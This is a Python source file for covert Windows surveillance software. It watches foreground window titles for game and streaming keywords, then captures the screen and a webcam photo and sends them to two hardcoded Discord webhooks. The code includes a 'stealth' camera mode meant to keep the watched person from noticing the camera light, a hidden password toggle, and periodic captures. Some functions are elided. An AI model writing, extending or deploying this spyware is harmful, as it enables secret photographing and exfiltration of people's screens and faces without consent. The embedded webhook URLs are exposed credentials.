import time
import threading
import win32gui
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab, Image
import json
import cv2
import numpy as np
import os
import subprocess
import sys

# ---------------- CONFIG ---------------- #
TARGET_KEYWORDS = [
    # General game platforms
    "crazygames",
    "poki",
    "kizi",
    "y8",
    "y8 games",
    "armor games",
    "miniclip",
    "addicting games",
    "kongregate",
    "gameflare",
    "friv",
    "friv games",
    "silvergames",
    "lagged",
    "unblocked games",
    "unblocked games 66",
    "unblocked games 76",
    "unblocked games 911",
    "cool math games",
    "math playground games",

    # Popular games
    "roblox",
    "minecraft",
    "fortnite",
    "among us",
    "call of duty",
    "call of duty warzone",
    "league of legends",
    "valorant",
    "counter strike",
    "csgo",
    "dota 2",
    "overwatch",
    "genshin impact",
    "apex legends",
    "pubg",
    "clash royale",
    "clash of clans",
    "brawl stars",
    "fifa",
    "rocket league",

    # Mobile / casual games
    "subway surfers",
    "temple run",
    "geometry dash",
    "bitlife",
    "paper io",
    "slither io",
    "agar io",
    "cookie clicker",
    "idle games",
    "clicker games",

    # French / multilingual gaming phrases
    "jeux gratuits",
    "jeu gratuit",
    "jeux en ligne",
    "joue maintenant",
    "jouer en ligne",
    "spiele kostenlos",
    "online spiele",
    "juegos gratis",
    "jugar ahora",

    # Emulators & retro
    "retro games",
    "classic games",
    "arcade games",
    "flash games",
    "browser games",
    "nes games online",
    "gba games online",

    # Streaming & gaming communities
    "twitch",
    "twitch gaming",
    "kick streaming",
    "youtube gaming",
    "discord gaming",
    "steam",
    "epic games",
    "origin games",
    "battle net"
]

PASSWORD = "stop123"    # Password to toggle tracking
TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking

# Discord Webhook Configuration (BOTH WEBHOOKS)
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
PERIODIC_SCREENSHOT_INTERVAL = 300  # Take screenshot every 5 seconds (even without detection)
HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds

# Stealth camera settings
CAMERA_STEALTH = True  # Set to True to prevent camera flash/light
CAMERA_RESOLUTION = (640, 480)  # Lower resolution = less noticeable
CAMERA_FPS = 15  # Lower FPS = less processing
DISABLE_CAMERA_INDICATOR = True  # Try to disable camera indicator light (if possible)

# ---------------- GLOBALS ---------------- #
lock = threading.Lock() # Thread safety
tracking_enabled = True  # Master toggle for tracking
password_buffer = ""    # Stores typed characters for password detection
last_key_time = 0       # For clearing password buffer after timeout
last_heartbeat_time = time.time()  # Track when last heartbeat was sent
last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
program_start_time = time.time()  # Track program start time
camera_device_index = 0  # Default camera index
camera_cap = None  # Keep camera open to prevent flash
camera_warmup_done = False  # Track if camera is warmed up

# Track focus state to prevent spam
current_focused_hwnd = None  # Current window handle
current_focused_title = None  # Current window title
last_alert_time = 0  # Last time we sent an alert
alert_cooldown = 60  # 60 seconds minimum between alerts for same window
recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}

def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    """Returns which keyword matched the title"""
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    """Take a screenshot of the entire screen"""
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception as e:
        print(f"[SCREENSHOT ERROR] {e}")
        return None

def stealth_camera_init():
    """Initialize camera in stealth mode to prevent flash"""
    global camera_cap, camera_device_index, camera_warmup_done
    
    if camera_cap is not None:
        return True
    
    # Try different camera backends for stealth
    backends = [
        cv2.CAP_DSHOW,  # DirectShow (Windows)
        cv2.CAP_MSMF,   # Microsoft Media Foundation
        cv2.CAP_V4L2,   # Video for Linux
        cv2.CAP_ANY     # Auto-detect
    ]
    
    for backend in backends:
        try:
            print(f"[CAMERA] Trying backend: {backend}")
            cap = cv2.VideoCapture(camera_device_index, backend)
            
            if cap.isOpened():
                # Set low resolution and FPS for stealth
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, CAMERA_RESOLUTION[0])
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, CAMERA_RESOLUTION[1])
                cap.set(cv2.CAP_PROP_FPS, CAMERA_FPS)
                
                # Try to disable auto-exposure and other auto settings
                try:
                    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure
                    cap.set(cv2.CAP_PROP_EXPOSURE, -5)  # Lower exposure
                except:
                    pass
                
                # Read a few frames to warm up camera without flash
                for _ in range(5):
                    ret, _ = cap.read()
                    if ret:
                        time.sleep(0.05)
                
                camera_cap = cap
                print(f"[CAMERA] Stealth initialization successful with backend: {backend}")
                
                # Warm up camera in background
                threading.Thread(target=camera_warmup, daemon=True).start()
                
                return True
                
        except Exception as e:
            print(f"[CAMERA] Backend {backend} failed: {e}")
            if 'cap' in locals():
                cap.release()
    
    print("[CAMERA] Stealth initialization failed")
    return False

def camera_warmup():
    """Warm up camera in background to prevent flash when capturing"""
    global camera_cap, camera_warmup_done
    
    if camera_cap is None:
        return
    
    try:
        print("[CAMERA] Warming up camera...")
        # Read frames continuously for 2 seconds to keep camera active
        warmup_end = time.time() + 2
        while time.time() < warmup_end and camera_cap is not None:
            ret, _ = camera_cap.read()
            if not ret:
                break
            time.sleep(0.1)
        
        camera_warmup_done = True
        print("[CAMERA] Camera warmup complete")
        
    except Exception as e:
        print(f"[CAMERA WARMUP ERROR] {e}")

def take_camera_picture():
    """Take a picture from the camera without flash"""
    global camera_cap, camera_warmup_done
    
    if not CAMERA_STEALTH:
        # Use original method if stealth is disabled
        return take_camera_picture_original()
    
    try:
        # Initialize camera if not already done
        if camera_cap is None:
            if not stealth_camera_init():
                return None
            
            # Wait for warmup if not done
            if not camera_warmup_done:
                print("[CAMERA] Waiting for warmup...")
                for _ in range(20):  # 2 second timeout
                    if camera_warmup_done:
                        break
                    time.sleep(0.1)
        
        if camera_cap is None or not camera_cap.isOpened():
            print("[CAMERA] Camera not available")
            return None
        
        # Read multiple frames and take the last one (most stable)
        frames = []
        for i in range(3):
            ret, frame = camera_cap.read()
            if ret and frame is not None:
                frames.append(frame)
            time.sleep(0.05)  # Small delay between frames
        
        if not frames:
            print("[CAMERA] No frames captured")
            return None
        
        # Use the last frame (most recent)
        frame = frames[-1]
        
        # Convert BGR to RGB
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        
        # Apply slight blur to reduce noise (makes it less obvious)
        if CAMERA_STEALTH:
            frame_rgb = cv2.GaussianBlur(frame_rgb, (3, 3), 0)
        
        # Convert to PIL Image
        camera_image = Image.fromarray(frame_rgb)
        
        return camera_image
        
    except Exception as e:
        print(f"[CAMERA STEALTH ERROR] {e}")
        # Fall back to original method
        return take_camera_picture_original()

def take_camera_picture_original():
    """Original camera capture method (non-stealth)"""
    try:
        cap = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("[CAMERA] Could not open camera")
            return None
        
        # Give camera time to adjust
        time.sleep(0.5)
        
        # Capture frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret or frame is None:
            print("[CAMERA] Failed to capture frame")
            return None
        
        # Convert BGR to RGB
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        # Convert to PIL Image
        camera_image = Image.fromarray(frame_rgb)
        
        return camera_image
        
    except Exception as e:
        print(f"[CAMERA ORIGINAL ERROR] {e}")
        return None

def detect_and_initialize_camera():
    """Try to detect and initialize available camera"""
    global camera_device_index
    
    print("[CAMERA] Detecting available cameras...")
    
    # Try to find camera by checking available devices
    available_cameras = []
    for i in range(5):  # Check first 5 indices
        try:
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    available_cameras.append(i)
                    print(f"[CAMERA] Found camera at index {i}")
        except:
            continue
    
    if available_cameras:
        camera_device_index = available_cameras[0]
        print(f"[CAMERA] Using camera index {camera_device_index}")
        
        if CAMERA_STEALTH:
            print("[CAMERA] Stealth mode enabled - initializing...")
            return stealth_camera_init()
        return True
    else:
        print("[CAMERA] No camera found, camera features disabled")
        return False

def cleanup_camera():
    """Clean up camera resources"""
    global camera_cap
    if camera_cap is not None:
        try:
            camera_cap.release()
            camera_cap = None
            print("[CAMERA] Camera released")
        except:
            pass

# ... (rest of the functions remain the same: send_to_webhook, send_to_all_webhooks, send_discord_alert, etc.) ...

def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
    """Send alert to Discord webhooks with optional screenshot and camera image"""
    # Prepare the message
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Add stealth indicator if camera was used
    camera_info = ""
    if camera_image and CAMERA_STEALTH:
        camera_info = "\n**Camera:** Stealth mode (no flash)"
    elif camera_image:
        camera_info = "\n**Camera:** Standard mode"
    
    embed = {
        "title": "⚠️ Target Application Detected",
        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`{camera_info}",
        "color": 16711680,  # Red color
        "footer": {
            "text": "Tracker System"
        }
    }
    
    payload = {
        "embeds": [embed],
        "content": f"🚨 **Target detected:** {title[:100]}"
    }
    
    return send_to_all_webhooks(payload, screenshot, camera_image)

def toggle_tracking():
    """Toggle tracking on/off"""
    global tracking_enabled, password_buffer, recently_alerted_windows
    
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    print(f"[TRACKING] Tracking {status}")
    
    # Clear recently alerted windows when toggling
    recently_alerted_windows.clear()
    
    # If disabling tracking, clean up camera
    if not tracking_enabled:
        cleanup_camera()
    # If enabling tracking and stealth mode is on, pre-warm camera
    elif tracking_enabled and CAMERA_STEALTH:
        threading.Thread(target=stealth_camera_init, daemon=True).start()
    
    # Send Discord notification about status change
    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
    
    password_buffer = ""  # Clear password buffer

# ... (rest of the keyboard event handlers and monitoring functions remain the same) ...

def heartbeat_monitor():
    """Periodically send heartbeat every 5 minutes"""
    global last_heartbeat_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to send heartbeat
            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
                threading.Thread(target=send_heartbeat, daemon=True).start()
                last_heartbeat_time = current_time
            
            # Clean up camera if not tracking
            if not tracking_enabled and camera_cap is not None:
                cleanup_camera()
            
            # Sleep for 1 minute and check again
            time.sleep(60)
            
        except Exception as e:
            print(f"[HEARTBEAT MONITOR ERROR] {e}")
            time.sleep(60)

def periodic_screenshot_monitor():
    """Periodically take screenshots every 5 seconds"""
    global last_periodic_screenshot_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to take periodic screenshot
            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
                tracking_enabled and SEND_SCREENSHOTS):
                
                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
                last_periodic_screenshot_time = current_time
                print(f"[PERIODIC] Next capture in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
            
            # Sleep for 1 second and check again
            time.sleep(1)
            
        except Exception as e:
            print(f"[PERIODIC MONITOR ERROR] {e}")
            time.sleep(1)

# ---------------- MAIN LOOP ---------------- #
print("[SYSTEM] Monitoring started...")
print("[SYSTEM] Tracking is ENABLED by default")
print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)")
print(f"[CAMERA] Stealth mode: {'ENABLED' if CAMERA_STEALTH else 'DISABLED'}")

# Initialize camera
print("[CAMERA] Initializing camera...")
camera_available = detect_and_initialize_camera()
if camera_available:
    print("[CAMERA] Camera ready for use")
else:
    print("[CAMERA] Camera not available, only screenshots will be sent")

# ... (rest of the initialization code remains the same) ...

# Setup keyboard listener
kb_listener = setup_keyboard_listener()

try:
    while True:
        # Only process tracking if enabled
        if tracking_enabled:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd).strip()

                if not title:
                    time.sleep(0.05)
                    continue

                # Detect target
                detected = title_matches_target(title)

                if detected:
                    keyword = get_matching_keyword(title)
                    
                    # Check if we should send an alert for this window
                    if should_send_alert(hwnd, title, keyword):
                        print(f"[DETECTION] Target detected: '{title}' (Keyword: {keyword})")
                        
                        # Small delay before taking screenshot to ensure window is focused
                        time.sleep(SCREENSHOT_DELAY)
                        
                        # Take screenshot in main thread
                        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                        
                        # Take camera picture (stealth mode if enabled)
                        camera_image = None
                        if camera_available:
                            camera_image = take_camera_picture()
                        
                        # Send alert to both webhooks
                        alert_thread = threading.Thread(
                            target=send_discord_alert,
                            args=(title, keyword, screenshot, camera_image),
                            daemon=True
                        )
                        alert_thread.start()
                    else:
                        # Debug logging for skipped alerts
                        if hwnd == current_focused_hwnd:
                            print(f"[SKIPPED] Already alerted for this window recently: '{title[:50]}...'")
                else:
                    # Not a target window, update focus tracking
                    current_focused_hwnd = hwnd
                    current_focused_title = title

            except Exception as e:
                print(f"[ERROR] {e}")
        
        # Sleep regardless of tracking state
        time.sleep(0.1)

except KeyboardInterrupt:
    print("[EXIT] Interrupted by user.")

finally:
    # Cleanup
    keyboard.unhook_all()
    cleanup_camera()
    print("[SYSTEM] Keyboard listeners stopped")
    print("[SYSTEM] Camera resources released")
